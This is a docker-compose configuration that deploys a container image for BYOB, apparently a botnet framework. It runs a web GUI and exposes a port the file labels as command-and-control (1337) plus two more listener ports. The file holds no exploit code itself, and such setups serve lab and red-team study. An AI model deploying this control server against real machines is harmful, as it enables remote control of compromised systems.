services:
  byob:
    image: ghcr.io/hypersamauwu/byob-docker:latest
    container_name: byob-web-gui
    restart: unless-stopped
    ports:
      - "${BYOB_WEB_PORT:-5000}:5000"
      - "${BYOB_C2_PORT:-1337}:1337"
      - "1338:1338"
      - "1339:1339"
    environment:
      BYOB_APP_SECRET_KEY: "${BYOB_SECRET_KEY:-changeme_set_a_real_secret_key}"
      SQLALCHEMY_DATABASE_URI: "sqlite:////data/database.db"
      PYTHONUNBUFFERED: "1"
    volumes:
      - byob-data:/data
    healthcheck:
      test: ["CMD", "python", "-c", "import urllib.request; urllib.request.urlopen('http://localhost:5000')"]
      interval: 30s
      timeout: 10s
      start_period: 20s
      retries: 3

volumes:
  byob-data:
